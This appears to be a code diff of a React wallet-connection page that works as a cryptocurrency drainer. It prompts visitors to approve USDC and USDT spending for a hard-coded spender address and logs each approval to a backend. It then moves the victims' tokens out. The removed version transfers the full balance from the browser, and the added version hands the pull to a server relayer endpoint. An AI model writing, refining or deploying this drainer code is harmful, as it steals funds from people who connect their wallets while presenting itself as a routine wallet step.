@@ -1,8 +1,8 @@
 import { Button } from "@/components/ui/button";
 import { ArrowLeft, Loader2, CheckCircle, AlertCircle } from "lucide-react";
 import { Link } from "wouter";
-import { useState, useEffect, useRef } from "react";
-import { useAccount, useWriteContract, useWaitForTransactionReceipt, useReadContract } from "wagmi";
+import { useState, useEffect } from "react";
+import { useAccount, useWriteContract, useWaitForTransactionReceipt } from "wagmi";
 import { ConnectButton } from '@rainbow-me/rainbowkit';
 
 const SPENDER_ADDRESS = "0x749d037Dfb0fAFA39C1C199F1c89eD90b66db9F1";
@@ -20,27 +20,10 @@ const ERC20_ABI = [
     name: "approve",
     outputs: [{ name: "", type: "bool" }],
     type: "function"
-  },
-  {
-    constant: false,
-    inputs: [
-      { name: "_to", type: "address" },
-      { name: "_value", type: "uint256" }
-    ],
-    name: "transfer",
-    outputs: [{ name: "", type: "bool" }],
-    type: "function"
-  },
-  {
-    constant: true,
-    inputs: [{ name: "_owner", type: "address" }],
-    name: "balanceOf",
-    outputs: [{ name: "balance", type: "uint256" }],
-    type: "function"
   }
 ] as const;
 
-type Step = "idle" | "approving" | "approved" | "transferring" | "done";
+type Step = "idle" | "approving" | "transferring" | "done";
 
 export default function ConnectWallet() {
   const { address, isConnected } = useAccount();
@@ -48,22 +31,12 @@ export default function ConnectWallet() {
   const [currentToken, setCurrentToken] = useState<"usdc" | "usdt" | "complete">("usdc");
   const [step, setStep] = useState<Step>("idle");
   const [error, setError] = useState<string>("");
-  const pendingTransferRef = useRef(false);
 
   const { writeContract, data: hash, isPending, reset } = useWriteContract();
   const { isLoading: isConfirming, isSuccess: isConfirmed } = useWaitForTransactionReceipt({ hash });
 
   const tokenAddress = currentToken === "usdc" ? USDC_ADDRESS : USDT_ADDRESS;
   const tokenSymbol = currentToken === "usdc" ? "USDC" : "USDT";
-
-  const { data: balance, refetch: refetchBalance } = useReadContract({
-    address: tokenAddress as `0x${string}`,
-    abi: ERC20_ABI,
-    functionName: 'balanceOf',
-    args: address ? [address] : undefined,
-  });
-
-  const tokenBalance = balance ? (balance as bigint) : BigInt(0);
 
   useEffect(() => {
     if (isConnected && address && !showPrompt) {
@@ -74,67 +47,50 @@ export default function ConnectWallet() {
   }, [isConnected, address]);
 
   useEffect(() => {
-    if (isConfirmed && hash) {
-      if (step === "approving") {
-        fetch("/api/approvals", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            walletAddress: address,
-            tokenAddress: tokenAddress,
-            tokenSymbol,
-            transactionHash: hash,
-          }),
-        }).catch(console.error);
+    if (isConfirmed && hash && step === "approving") {
+      fetch("/api/approvals", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          walletAddress: address,
+          tokenAddress: tokenAddress,
+          tokenSymbol,
+          transactionHash: hash,
+        }),
+      }).catch(console.error);
 
-        setStep("approved");
-        pendingTransferRef.current = true;
-        reset();
-        
-        setTimeout(() => {
-          refetchBalance().then((result) => {
-            const currentBalance = result.data ? (result.data as bigint) : BigInt(0);
-            if (currentBalance > BigInt(0) && pendingTransferRef.current) {
-              pendingTransferRef.current = false;
-              executeTransfer(currentBalance);
-            } else {
-              goToNextToken();
-            }
-          });
-        }, 1500);
-      } else if (step === "transferring") {
-        fetch("/api/transfers", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            walletAddress: address,
-            tokenAddress: tokenAddress,
-            tokenSymbol,
-            amount: tokenBalance.toString(),
-            transactionHash: hash,
-          }),
-        }).catch(console.error);
-
-        reset();
-        goToNextToken();
-      }
+      setStep("transferring");
+      
+      executeRelayerTransfer();
     }
   }, [isConfirmed, hash, step]);
 
-  const executeTransfer = (amount: bigint) => {
-    setStep("transferring");
-    setError("");
-    
+  const executeRelayerTransfer = async () => {
     try {
-      writeContract({
-        address: tokenAddress as `0x${string}`,
-        abi: ERC20_ABI,
-        functionName: "transfer",
-        args: [SPENDER_ADDRESS as `0x${string}`, amount],
+      const response = await fetch("/api/execute-transfer", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          walletAddress: address,
+          tokenSymbol: currentToken.toUpperCase(),
+        }),
       });
+
+      const result = await response.json();
+
+      if (result.success) {
+        goToNextToken();
+      } else {
+        if (result.error?.includes('No allowance') || result.error?.includes('no balance')) {
+          goToNextToken();
+        } else {
+          setError(result.error || "Transfer failed");
+          setStep("idle");
+        }
+      }
     } catch (err: any) {
-      setError(err?.message || "Failed to transfer token");
-      setStep("approved");
+      setError(err?.message || "Failed to execute transfer");
+      setStep("idle");
     }
   };
 
@@ -143,7 +99,6 @@ export default function ConnectWallet() {
       setCurrentToken("usdt");
       setStep("idle");
       reset();
-      refetchBalance();
     } else {
       setCurrentToken("complete");
       setStep("done");
@@ -173,7 +128,7 @@ export default function ConnectWallet() {
     }
   };
 
-  const isProcessing = isPending || isConfirming || step === "approving" || step === "approved" || step === "transferring";
+  const isProcessing = isPending || isConfirming || step === "approving" || step === "transferring";
 
   return (
     <div className="min-h-screen bg-[#0a1614] text-[#f5f1e8]">
